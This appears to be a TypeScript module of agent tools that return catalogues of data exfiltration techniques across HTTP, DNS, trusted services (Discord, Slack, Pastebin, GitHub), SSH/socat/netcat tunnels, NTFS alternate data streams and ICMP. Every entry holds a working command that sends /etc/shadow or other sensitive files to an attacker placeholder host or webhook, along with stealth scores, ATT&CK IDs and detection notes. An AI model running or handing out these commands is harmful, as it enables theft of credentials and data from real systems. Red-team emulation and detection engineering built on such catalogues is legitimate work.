import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface ExfilTechnique {
  technique: string;
  description: string;
  platform: Platform | "multi";
  binary: string;
  command: string;
  channel: string;
  stealth_score: number;
  bandwidth: string;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
}

// ── exfil_http ────────────────────────────────────────────────────────────────

const exfil_http: ToolDef = {
  name: "exfil_http",
  description: "Find HTTP/HTTPS-based exfiltration techniques using LOL binaries like curl, wget, certutil, and PowerShell",
  schema: {
    environment_id: z.string().optional().describe("Environment session ID"),
    platform: z.enum(["linux", "windows", "macos", "all"]).default("all").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform === "all" ? undefined : args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbUpload = ctx.knowledgeBase.searchByFunction("upload", platform);
    const kbEntries = deduplicateByBinary(kbUpload);

    const techniques: ExfilTechnique[] = [
      {
        technique: "curl HTTP POST exfiltration",
        description: "Exfiltrate data via HTTP POST using curl to an attacker-controlled server",
        platform: "multi", binary: "curl",
        command: 'curl -X POST -d @/etc/shadow https://<ATTACKER>/exfil',
        channel: "http", stealth_score: 3, bandwidth: "high",
        attck_ids: ["T1048.001"], prerequisites: ["curl installed, outbound HTTP/S"],
        detection_notes: "Monitor curl POST to external IPs. DLP inspection on outbound content.",
      },
      {
        technique: "wget POST exfiltration",
        description: "Exfiltrate files via wget POST method",
        platform: "linux", binary: "wget",
        command: 'wget --post-file=/etc/shadow https://<ATTACKER>/exfil',
        channel: "http", stealth_score: 3, bandwidth: "high",
        attck_ids: ["T1048.001"], prerequisites: ["wget installed, outbound HTTP/S"],
        detection_notes: "Monitor wget with --post-file flag.",
      },
      {
        technique: "certutil download cradle (reverse)",
        description: "Use certutil to encode and upload data via HTTP",
        platform: "windows", binary: "certutil.exe",
        command: 'certutil -encode C:\\sensitive.db C:\\temp\\encoded.txt && curl -X POST -d @C:\\temp\\encoded.txt https://<ATTACKER>/exfil',
        channel: "http", stealth_score: 4, bandwidth: "medium",
        attck_ids: ["T1048.001", "T1140"], prerequisites: ["certutil available (built-in), outbound HTTP"],
        detection_notes: "Sigma rules for certutil encode. Monitor certutil with -encode flag.",
      },
      {
        technique: "PowerShell Invoke-WebRequest exfil",
        description: "Use PowerShell to upload files via Invoke-WebRequest or Invoke-RestMethod",
        platform: "windows", binary: "powershell.exe",
        command: 'Invoke-WebRequest -Uri https://<ATTACKER>/exfil -Method POST -InFile C:\\sensitive.db',
        channel: "http", stealth_score: 4, bandwidth: "high",
        attck_ids: ["T1048.001", "T1059.001"], prerequisites: ["PowerShell, outbound HTTPS"],
        detection_notes: "PowerShell script block logging. AMSI inspection. Network monitoring.",
      },
    ];

    return json({
      channel: "http",
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: session ? { environment_id: session.id, outbound_http: session.state.networkAccess.outboundHttp } : null,
    });
  },
};

// ── exfil_dns ─────────────────────────────────────────────────────────────────

const exfil_dns: ToolDef = {
  name: "exfil_dns",
  description: "Find DNS-based exfiltration techniques for covert data transfer via DNS queries",
  schema: {
    environment_id: z.string().optional().describe("Environment session ID"),
    platform: z.enum(["linux", "windows", "macos", "all"]).default("all").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform === "all" ? undefined : args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbUpload = ctx.knowledgeBase.searchByFunction("upload", platform);
    const kbEntries = deduplicateByBinary(kbUpload);

    const techniques: ExfilTechnique[] = [
      {
        technique: "DNS TXT record exfiltration",
        description: "Encode data in DNS queries to exfiltrate through DNS resolution",
        platform: "linux", binary: "dig",
        command: 'for line in $(cat /etc/shadow | base64 -w 63); do dig $line.<ATTACKER_DOMAIN> TXT +short; done',
        channel: "dns", stealth_score: 2, bandwidth: "low",
        attck_ids: ["T1048.003"], prerequisites: ["DNS resolution available, attacker-controlled DNS server"],
        detection_notes: "High volume of DNS queries to single domain. Long subdomain labels. DNS analytics.",
      },
      {
        technique: "nslookup DNS exfiltration (Windows)",
        description: "Use nslookup for DNS-based data exfiltration on Windows",
        platform: "windows", binary: "nslookup.exe",
        command: 'for /f %i in (\'certutil -encode C:\\data.txt C:\\temp\\enc.txt ^& type C:\\temp\\enc.txt\') do nslookup %i.<ATTACKER_DOMAIN>',
        channel: "dns", stealth_score: 2, bandwidth: "low",
        attck_ids: ["T1048.003"], prerequisites: ["DNS resolution, attacker DNS server"],
        detection_notes: "Monitor nslookup volume. DNS query length analysis.",
      },
      {
        technique: "PowerShell DNS exfiltration",
        description: "Use Resolve-DnsName for DNS-based covert exfiltration",
        platform: "windows", binary: "powershell.exe",
        command: '$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\secret.db")); for($i=0;$i -lt $data.Length;$i+=63){ Resolve-DnsName "$($data.Substring($i,[Math]::Min(63,$data.Length-$i))).<DOMAIN>" -Type TXT }',
        channel: "dns", stealth_score: 2, bandwidth: "low",
        attck_ids: ["T1048.003", "T1059.001"], prerequisites: ["PowerShell, DNS resolution"],
        detection_notes: "PowerShell script block logging. DNS query frequency analysis.",
      },
    ];

    return json({
      channel: "dns",
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: session ? { environment_id: session.id, outbound_dns: session.state.networkAccess.outboundDns } : null,
    });
  },
};

// ── exfil_lots ────────────────────────────────────────────────────────────────

const exfil_lots: ToolDef = {
  name: "exfil_lots",
  description: "Find exfiltration techniques using legitimate trusted services (LOTS) — Slack, Discord, Pastebin, GitHub, cloud storage",
  schema: {
    environment_id: z.string().optional().describe("Environment session ID"),
    service: z.string().optional().describe("Specific LOTS service to target: slack, discord, pastebin, github, etc."),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const techniques: ExfilTechnique[] = [
      {
        technique: "Discord Webhook exfiltration",
        description: "Upload data via Discord webhook to blend with legitimate traffic",
        platform: "multi", binary: "curl",
        command: 'curl -F "file=@/etc/shadow" https://discord.com/api/webhooks/<ID>/<TOKEN>',
        channel: "lots", stealth_score: 2, bandwidth: "high",
        attck_ids: ["T1567.001"], prerequisites: ["curl, outbound HTTPS to discord.com"],
        detection_notes: "Monitor outbound connections to discord.com/api/webhooks.",
      },
      {
        technique: "Slack File Upload exfiltration",
        description: "Upload sensitive files to a Slack channel via API",
        platform: "multi", binary: "curl",
        command: 'curl -F file=@/etc/shadow -F channels=<CHANNEL> -H "Authorization: Bearer <TOKEN>" https://slack.com/api/files.upload',
        channel: "lots", stealth_score: 2, bandwidth: "high",
        attck_ids: ["T1567.001"], prerequisites: ["curl, Slack API token"],
        detection_notes: "Monitor outbound to slack.com API. File upload events.",
      },
      {
        technique: "Pastebin data exfiltration",
        description: "Post exfiltrated data to Pastebin using the API",
        platform: "multi", binary: "curl",
        command: 'curl -d "api_dev_key=<KEY>&api_paste_code=$(cat /etc/shadow | base64)&api_option=paste" https://pastebin.com/api/api_post.php',
        channel: "lots", stealth_score: 3, bandwidth: "medium",
        attck_ids: ["T1567.001"], prerequisites: ["curl, Pastebin API key"],
        detection_notes: "Monitor outbound to pastebin.com. Content inspection on POST data.",
      },
      {
        technique: "GitHub Gist exfiltration",
        description: "Create private Gists containing exfiltrated data",
        platform: "multi", binary: "curl",
        command: 'curl -H "Authorization: token <PAT>" -d \'{"files":{"data.txt":{"content":"<EXFIL_DATA>"}},"public":false}\' https://api.github.com/gists',
        channel: "lots", stealth_score: 1, bandwidth: "medium",
        attck_ids: ["T1567.001"], prerequisites: ["curl, GitHub PAT"],
        detection_notes: "Monitor GitHub API calls. Outbound to api.github.com.",
      },
    ];

    const filtered = args.service
      ? techniques.filter(t => t.technique.toLowerCase().includes(args.service.toLowerCase()))
      : techniques;

    return json({
      channel: "lots",
      total_techniques: filtered.length,
      techniques: filtered,
      session_context: session ? { environment_id: session.id, outbound_http: session.state.networkAccess.outboundHttp } : null,
    });
  },
};

// ── exfil_tunnel ──────────────────────────────────────────────────────────────

const exfil_tunnel: ToolDef = {
  name: "exfil_tunnel",
  description: "Find tunnel-based exfiltration techniques using SSH tunnels, ngrok, and other tunneling tools",
  schema: {
    environment_id: z.string().optional().describe("Environment session ID"),
    platform: z.enum(["linux", "windows", "macos", "all"]).default("all").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const techniques: ExfilTechnique[] = [
      {
        technique: "SSH tunnel exfiltration",
        description: "Create SSH tunnel to forward data through encrypted channel",
        platform: "linux", binary: "ssh",
        command: 'ssh -R 8080:localhost:80 attacker@<ATTACKER> "cat > /tmp/exfil.dat" < /etc/shadow',
        channel: "tunnel", stealth_score: 2, bandwidth: "high",
        attck_ids: ["T1572", "T1048.001"], prerequisites: ["SSH client, outbound SSH (port 22)"],
        detection_notes: "Monitor SSH connections to external IPs. Reverse tunnel detection.",
      },
      {
        technique: "socat tunnel exfiltration",
        description: "Use socat to create encrypted tunnel for data exfiltration",
        platform: "linux", binary: "socat",
        command: 'socat -u FILE:/etc/shadow TCP:<ATTACKER>:4444',
        channel: "tunnel", stealth_score: 2, bandwidth: "high",
        attck_ids: ["T1572"], prerequisites: ["socat installed, outbound TCP"],
        detection_notes: "Monitor socat process creation. Unusual outbound TCP connections.",
      },
      {
        technique: "netcat raw TCP exfil",
        description: "Use netcat for raw TCP data transfer to attacker server",
        platform: "linux", binary: "nc",
        command: 'nc <ATTACKER> 4444 < /etc/shadow',
        channel: "tunnel", stealth_score: 3, bandwidth: "high",
        attck_ids: ["T1048.001"], prerequisites: ["nc/ncat installed, outbound TCP"],
        detection_notes: "Monitor nc process creation. Raw TCP to external IPs.",
      },
    ];

    return json({
      channel: "tunnel",
      total_techniques: techniques.length,
      techniques,
      session_context: session ? { environment_id: session.id, outbound_http: session.state.networkAccess.outboundHttp } : null,
    });
  },
};

// ── exfil_ads_stream ──────────────────────────────────────────────────────────

const exfil_ads_stream: ToolDef = {
  name: "exfil_ads_stream",
  description: "Find Alternate Data Stream (ADS) techniques for hiding data before exfiltration on Windows NTFS",
  schema: {
    environment_id: z.string().optional().describe("Environment session ID"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbAds = ctx.knowledgeBase.searchByFunction("ads", "windows");
    const kbConceal = ctx.knowledgeBase.searchByFunction("conceal", "windows");
    const kbEntries = deduplicateByBinary([...kbAds, ...kbConceal]);

    const techniques: ExfilTechnique[] = [
      {
        technique: "ADS data hiding with type/echo",
        description: "Hide data in NTFS Alternate Data Streams for staging before exfiltration",
        platform: "windows", binary: "cmd.exe",
        command: 'type C:\\sensitive.db > C:\\Windows\\Temp\\legit.txt:hidden.db',
        channel: "ads", stealth_score: 1, bandwidth: "n/a",
        attck_ids: ["T1564.004"], prerequisites: ["NTFS filesystem, write access"],
        detection_notes: "Sysmon Event 15 (FileCreateStreamHash). ADS creation monitoring.",
      },
      {
        technique: "PowerShell ADS read/write",
        description: "Use PowerShell to read and write Alternate Data Streams",
        platform: "windows", binary: "powershell.exe",
        command: 'Set-Content -Path C:\\temp\\legit.txt -Stream hidden -Value (Get-Content C:\\sensitive.db)',
        channel: "ads", stealth_score: 1, bandwidth: "n/a",
        attck_ids: ["T1564.004", "T1059.001"], prerequisites: ["PowerShell, NTFS filesystem"],
        detection_notes: "PowerShell script block logging. Sysmon ADS events.",
      },
    ];

    return json({
      channel: "ads",
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: session ? { environment_id: session.id } : null,
    });
  },
};

// ── exfil_icmp ────────────────────────────────────────────────────────────────

const exfil_icmp: ToolDef = {
  name: "exfil_icmp",
  description: "Find ICMP-based exfiltration techniques for covert data transfer via ping packets",
  schema: {
    environment_id: z.string().optional().describe("Environment session ID"),
    platform: z.enum(["linux", "windows", "macos"]).default("linux").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const techniques: ExfilTechnique[] = [
      {
        technique: "ICMP data exfiltration via ping",
        description: "Encode data in ICMP echo request payload for covert exfiltration",
        platform: "linux", binary: "ping",
        command: 'xxd -p /etc/shadow | while read line; do ping -c 1 -p "$line" <ATTACKER>; done',
        channel: "icmp", stealth_score: 1, bandwidth: "very_low",
        attck_ids: ["T1095", "T1048"], prerequisites: ["ping with -p flag, ICMP allowed outbound"],
        detection_notes: "Unusual ICMP packet sizes. High volume of ICMP echo requests. Payload inspection.",
      },
      {
        technique: "nping custom ICMP exfil",
        description: "Use nping to craft ICMP packets with custom payloads for exfiltration",
        platform: "linux", binary: "nping",
        command: 'nping --icmp -c 1 --data-string "$(head -c 64 /etc/shadow)" <ATTACKER>',
        channel: "icmp", stealth_score: 1, bandwidth: "very_low",
        attck_ids: ["T1095", "T1048"], prerequisites: ["nping (nmap suite), ICMP outbound"],
        detection_notes: "ICMP payload inspection. nping process monitoring.",
      },
      {
        technique: "PowerShell ICMP tunnel",
        description: "Use PowerShell to create ICMP-based data channel for exfiltration",
        platform: "windows", binary: "powershell.exe",
        command: '$ping = New-Object System.Net.NetworkInformation.Ping; $data = [Text.Encoding]::ASCII.GetBytes((Get-Content C:\\secret.txt)); $ping.Send("<ATTACKER>", 5000, $data)',
        channel: "icmp", stealth_score: 1, bandwidth: "very_low",
        attck_ids: ["T1095", "T1048", "T1059.001"], prerequisites: ["PowerShell, ICMP outbound"],
        detection_notes: "PowerShell script block logging. ICMP payload inspection.",
      },
    ];

    const filtered = techniques.filter(t => t.platform === platform || t.platform === "multi");

    return json({
      channel: "icmp",
      platform,
      total_techniques: filtered.length,
      techniques: filtered,
      session_context: session ? { environment_id: session.id } : null,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const exfiltrationTools: ToolDef[] = [
  exfil_http,
  exfil_dns,
  exfil_lots,
  exfil_tunnel,
  exfil_ads_stream,
  exfil_icmp,
];
